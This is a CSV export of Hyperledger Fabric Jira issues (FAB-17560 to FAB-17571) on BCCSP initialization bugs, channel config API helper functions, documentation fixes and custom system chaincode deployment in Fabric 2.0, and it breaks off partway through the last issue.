information),suryalnvs,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Mar/20 2:20 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/114;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Global var for error and sync.Once,FAB-17560,44464,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,skarim,skarim,29/Feb/20 12:47 AM,03/Mar/20 3:24 AM,28/Oct/23 3:09 AM,03/Mar/20 3:24 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"There are a couple of implementations details in BCCSP that makes it difficult to call down into BCCSP with varying configuration.

*First Issue:*

The first issue is the use of sync.Once, see: See: [https://github.com/hyperledger/fabric/blob/v1.4.6/bccsp/factory/pkcs11.go#L39]

What this means is that if BCCSP is initialized with bad config (wrong label or pin) when using PKCS11, it has entered into a bad state from which it cannot recover. All subsequent requests, will fail even if the configuration has been corrected and is being passed down to BCCSP.

*Second Issue:*

I used bad HSM config the first time, now I want to switch to using a non-hsm configuration. This use case will not work if the BCCSP library has already encountered an error, unfortunately BCCSP when it gets an error stores that error in a global variable which once sets remains sets. Here: [https://github.com/hyperledger/fabric/blob/master/bccsp/factory/factory.go#L43]*[|https://github.com/hyperledger/fabric/blob/master/bccsp/factory/factory.go#L43]*

Even though you might be using a valid configuration after using a bad one, BCCSP will always continue to return that previously hit error and initialization will always fail.",,angelo.decaro,denyeart,skarim,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019mr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),angelo.decaro,denyeart,skarim,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Feb/20 3:30 AM;angelo.decaro;There is something not clear to me. Why don’t you restart the peer to make the changes effective?
When you write about configuration, you mean the parameters in core.yaml, no?;;;","03/Mar/20 3:24 AM;denyeart;Resolved with fabric-ca client change in https://github.com/hyperledger/fabric-ca/pull/108;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove or rationalize the presence of SkipAsForeign in the config package,FAB-17561,44466,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,sykesm,sykesm,29/Feb/20 2:02 AM,17/Mar/20 4:20 AM,28/Oct/23 3:09 AM,09/Mar/20 7:07 PM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"This may have been relevant in configtxgen but I don't know that it's relevant in the config package.

{{code}}
// SkipAsForeign indicates that this org definition is actually unknown to this 
// instance of the tool, so, parsing of this org's parameters should be ignored.
SkipAsForeign bool
{{code}}

Within our sample it reads like this:

{{code}}
        # SkipAsForeign can be set to true for org definitions which are to be
        # inherited from the orderer system channel during channel creation.  This
        # is especially useful when an admin of a single org without access to the
        # MSP directories of the other orgs wishes to create a channel.  Note
        # this property must always be set to false for orgs included in block
        # creation.
        SkipAsForeign: false
{{code}}

If it's needed, please rationalize it here; if it's not, please remove the field and the code that references it from the config package.",,sykesm,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzy3",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Mar/20 4:49 AM;tsharris;[https://github.com/hyperledger/fabric/pull/811];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Mailing list correction to Still Have Questions? document,FAB-17562,44467,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,pvrbharg,pvrbharg,pvrbharg,01/Mar/20 9:30 AM,01/Mar/20 11:58 PM,28/Oct/23 3:09 AM,01/Mar/20 10:59 PM,v2.0.0,,,,,,,,,v2.0.2,v2.1.0,,,fabric-docs,,,,,,,,,0,,,,,,"Mailing list correction to Still Have Questions? document at:

[https://hyperledger-fabric.readthedocs.io/en/latest/questions.html]

Mailing list address shown below

[hyperledger-fabric@lists.hyperledger.org|mailto:hyperledger-fabric%40lists.hyperledger.org]

should instead be [fabric@lists.hyperledger.org.|mailto:hyperledger-fabric%40lists.hyperledger.org]

Thanks.",,pvrbharg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019n7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pvrbharg,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Replace BYFN with test network in Fabric 2.x,FAB-17563,44479,,Epic,Closed,FAB,Fabric,software,denyeart,,,High,Done,,pandrejko,pandrejko,02/Mar/20 10:13 PM,05/Aug/20 8:37 PM,28/Oct/23 3:09 AM,30/Jun/20 12:13 AM,v2.0.0,,,,,,,,,v2.2.0,,,,fabric-docs,,,,,,,,,0,,,,,,With the new Test Network and Fabric Deployment guide we should remove BYFN since too many people are using it as a guide,,knagware9,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DONE. Samples and tutorials shifted to test network.,(Please add high level design or a link to the design),Unset,Unset,Required,ghx-label-9,,Remove BYFN,To Do,No,,Unset,No,,,"1|i019oj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),knagware9,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Mar/20 12:35 AM;pandrejko;Feedback from Rob:

The test network is great. But it would be good to explain more around:

	- This is a logical setup vs. a physical setup.
        - Need More information about MSP in the test network.;;;","13/Mar/20 12:53 AM;knagware9;So now Test network can be used as fabric network which can be deployed in production. there is already fabric ca used instead of cryptogen.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
2.0 Custom system chaincode deployment & invocation,FAB-17564,44480,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,kopaygorodsky,kopaygorodsky,02/Mar/20 10:25 PM,08/Feb/22 3:24 PM,28/Oct/23 3:09 AM,26/Mar/20 12:05 AM,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"I'm using 2.0 fabric in which plugins feature is disabled. https://jira.hyperledger.org/browse/FAB-15338

I cloned fabric, added my scc to pkg/core/scc/mycc and registered it in https://github.com/hyperledger/fabric/blob/master/internal/peer/node/start.go#L730 and whitelisted in core.yaml.
I see peer accepted it and deployed. When I try to call it using go sdk I get `returned error: lscc's state for [mycc] not found` in peer's logs and invalid transaction.  1.4 validator is used. My first thoughts were that it tries to Invoke system cc using standard lscc lifecycle, not system one. which is not right. 
Also, I found this issue, maybe this is related somehow, but there are a lot of changes from 1.0 to 2.0 https://jira.hyperledger.org/browse/FAB-5671

importsysccs.go is not there anymore.
https://github.com/hyperledger/fabric/pull/350/files this documentation is not clear. 

https://pastebin.com/DsJ5G8k5 logs from the peer

Mycc is very similar to _lifecycle in a way that I stores votes(approvals) for channel governance",,denyeart,jyellick,kopaygorodsky,Rajatsharma,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15338,FAB-15343,FAB-5671,FAB-12965,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019or:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,jyellick,kopaygorodsky,Rajatsharma,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Mar/20 11:44 PM;kopaygorodsky;Adding mycc here https://github.com/hyperledger/fabric/blob/master/core/committer/txvalidator/v14/vscc_validator.go#L412 fixes the problem, but I'm still not sure that this is a right way to do such things. I know thay you are moving away from system chaincodes, but it simplifies a lot in my case.

Btw have no idea what will happen if I use 2.0 capabilities, I just can't try them because sdk does not support new lifecycle. ;;;","19/Mar/20 1:31 PM;denyeart;[~sykesm] [~mastersingh24] What is the guidance for system chaincodes these days?;;;","25/Mar/20 8:05 PM;sykesm;{quote}What is the guidance for system chaincodes these days?{quote}

There really isn't any. Since we don't have SCC plugins, we don't have tests, samples, or examples. In v2, the expectation is that those extending the peer with system chaincode are experienced Fabric developers and capable of maintaining a sparse fork that includes custom SCC.

As for the error reported in this issue, adding the custom SCC name to the builtin chaincode list should probably have been sufficient but, unrelated to the extraction of SCC plugins, the validation package was updated to remove some sources of non-determinism. This was intentional.

{code}
commit 41e99e98754135792d525c959577337d4cb0daa6
tree 34eae80e650a5fb2634cbaa0d059948adb05a7cb
parent 579e66dbdc7c58620c0ca5f68222240ccf5b386d
author Jason Yellick <jyellick@us.ibm.com> Mon Jul 29 11:37:35 2019 -0400
committer Jason Yellick <jyellick@us.ibm.com> Wed Jul 31 12:02:48 2019 -0400

FAB-16124 Inline sccprovider checks in validation

The validation needs for the things provided by the sccprovider to be
constant across releases, however, we inject them as a dynamic
dependency.  Fixing.

Change-Id: I324727a4f4a047f795c550340d324d254464ecc4
{code}

Adding the custom SCC name to the appropriate functions at the bottom of the file is appropriate for 1.4 capabilities.

As for v2 capabilities, I wouldn't be surprised if there were problems but I don't know what they might be. Perhaps [~jyellick] has some thoughts.

;;;","25/Mar/20 11:45 PM;jyellick;As [~sykesm] mentions, there really isn't any testing around this, so the official statement would be ""it's not supported"".

That being said, my recommendation would be _not_ to add them into the list of SCCs. The notion of SCCs being defined in this way has always been very broken (how do you set an endorsement policy? how do you define collections? etc.).

Instead, I would encourage you to enable the v2.0 application capabilities, and use the new lifecycle.  At this point, you should be able to to create the chaincode definition as normal (approve on enough orgs, then commit the definition).  For the package ID, specify the name of your system chaincode (e.g. {{mycc}}).  At this point, I believe everything should simply work.;;;","25/Mar/20 11:57 PM;kopaygorodsky;thanks for your answers, as I understood I'll need to move from that idea. Btw it works now, I'm using scc as distributed storage per channel. There are channel config blocks and collection of the channel members signs. Every participant can see proposals and sign it, I don't care about endorsement policy because I validate proposal using policyMgr.EvaluateSignedData(signedData).;;;","26/Mar/20 12:05 AM;sykesm;None of the available resolutions really reflect reality...

I'm glad things are working on your end and hopefully you don't run into issues as you move towards the 2.0 capabilities and the new lifecycle.;;;","31/Oct/20 8:58 AM;kopaygorodsky;[~sykesm] [~jyellick] Sorry to update on the closed ticket. 
I've just moved to 2.0 capabilities and it stopped working :( 
Querying is fine, but it fails when a peer validates a transaction from orderer. 
https://gist.github.com/kopaygorodsky/8ccbf53db927fa5abe7133e23e3b60e7

Chaincode is built using shim package with shim.GetState and shim.PutState functions. I don't have any collections, endorsement policy is not that important. 

Could you, please, suggest where to look?  I would like to fix it, a lot of people are using this feature.  https://github.com/hyperledger/fabric/pull/1822

Seems I need to write another validator for cases when cc is a system chaincode (implements `SelfDescribingSysCC`)
https://github.com/hyperledger/fabric/blob/master/core/committer/txvalidator/v20/plugindispatcher/dispatcher.go#L192
policydsl.SignedByAnyMember() can be used as policy.;;;","08/Feb/22 3:24 PM;Rajatsharma;[~kopaygorodsky], 
Was there any progress in working with the system chaincode?  Even I wanted to migrate a system chaincode from V1.4.2 to V2.X. 

The main feature that I want to use is that the chaincode should be available on a channel as soon as the channel is created.  Any resource on that or any approach will be highly appreciated. 

cc- [~jyellick] [~sykesm];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement an Example test that demonstrates creating a new create channel tx,FAB-17565,44482,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,caod,caod,03/Mar/20 3:22 AM,13/Mar/20 3:42 AM,28/Oct/23 3:09 AM,13/Mar/20 3:42 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like an example in the library documentation that shows me idiomatic usage of the package to create new channel create transactions and sign them.

 

*Acceptance*

I can find an example for creating create channel transactions in the GoDoc for the package.",,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzy9",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"09/Mar/20 11:34 PM;dereckluo;https://github.com/hyperledger/fabric/pull/816;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE removes per tx event and proposal transmode,FAB-17566,44483,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,03/Mar/20 3:28 AM,18/Mar/20 3:26 AM,28/Oct/23 3:09 AM,05/Mar/20 3:50 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"PTE removes

1. per transaction event support

2. transaction mode proposal",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-2247,,,No,,Unset,No,,,"1|i019p7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,release-2.4,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Mar/20 3:54 AM;dongming;[https://github.com/hyperledger/fabric-test/pull/116];;;","03/Mar/20 11:29 PM;dongming;[more unused code cleanup |https://github.com/hyperledger/fabric-test/pull/121]

[https://github.com/hyperledger/fabric-test/pull/121];;;","04/Mar/20 11:56 PM;dongming;move assignChannelPeers() to pte-utils.js so that it can be called from both pte-main.js and pte-execRequest.js

[https://github.com/hyperledger/fabric-test/pull/124];;;","05/Mar/20 11:47 PM;dongming;replace channelAddPeerEventJoin() by utility assignChannelPeers() defined in pte-utils.js when join channel

[https://github.com/hyperledger/fabric-test/pull/125];;;","07/Mar/20 12:04 AM;dongming;move addOrderer() to pte-util.js

[https://github.com/hyperledger/fabric-test/pull/126];;;","18/Mar/20 3:26 AM;dongming;removed unused code of mix transaction type in pte-main.js

[https://github.com/hyperledger/fabric-test/pull/129];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement helper function for retrieving anchor peers from an existing config,FAB-17567,44484,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,caod,caod,03/Mar/20 3:34 AM,17/Mar/20 4:21 AM,28/Oct/23 3:09 AM,07/Mar/20 9:18 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to retrieve existing anchor peers without manually parsing the config transaction.

 

*Acceptance*

I should be able to call a function for retrieving anchor peers for a specific org. The example test should also be updated to demonstrate usage of this helper.",,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17576,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzyc",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Mar/20 5:08 AM;dereckluo;https://github.com/hyperledger/fabric/pull/812
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement helper function for retrieving orderer configuration from an existing config,FAB-17568,44485,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,03/Mar/20 3:38 AM,25/Mar/20 11:47 PM,28/Oct/23 3:09 AM,25/Mar/20 4:49 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to retrieve existing orderer configuration without manually parsing the config transaction so I can persist values I don't want to change when updating orderer configuration

 

*Acceptance*

I should be able to call a function for retrieving orderer configuration that returns a config.Orderer. I can then modify fields on the Orderer configuration and pass it to config.UpdateOrdererConfiguration to update the orderer's configuration. The example tests should also be updated to demonstrate usage of this helper.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17636,FAB-17638,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzyh9",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Mar/20 12:15 AM;caod;https://github.com/hyperledger/fabric/pull/893;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement helper function for retrieving an org's configuration from an existing config,FAB-17569,44486,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,caod,caod,03/Mar/20 3:44 AM,18/Mar/20 1:13 AM,28/Oct/23 3:09 AM,18/Mar/20 1:13 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to retrieve existing application, orderer, or consortium org configuration without manually parsing the config transaction so I can persist values I don't want to change when updating an org's configuration.

 

*Acceptance*

I should be able to call a function for retrieving an application, orderer, or consortium org's configuration that returns a config.Organization. I can then modify fields on the Organization and pass it to an appropriate update organization function to update the org's configuration. The example tests should also be updated to demonstrate usage of this helper.",,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzyh",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Mar/20 3:17 AM;dereckluo;https://github.com/hyperledger/fabric/pull/864
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement functions for adding and removing policies for application orgs and application groups,FAB-17570,44487,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,03/Mar/20 3:48 AM,19/Mar/20 3:18 AM,28/Oct/23 3:09 AM,19/Mar/20 3:18 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to update an application org's and an application group's configuration by adding or removing policies.

 

*Acceptance*

I should be able to call this function to modify a config transaction and then process further configuration updates on the modified config transaction. The examples test should be updated to demonstrate usage of this feature.

 ",,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17571,FAB-17572,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzyg",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),tsharris,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Mar/20 4:20 AM;tsharris;[https://github.com/hyperledger/fabric/pull/830];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement functions for adding and removing policies for orderer orgs and orderer group,FAB-17571,44488,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,03/Mar/20 3:54 AM,19/Mar/20 3:18 AM,28/Oct/23 3:09 AM,19/Mar/20 3:18 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to update an orderer org's and orderer group's configuration by adding or removing policies.

 

*Acceptance*

I should be able to call this function to modify a config transaction and then process further configuration updates on the modified config transaction. The examples test should be updated to demonstrate usage of this feature.

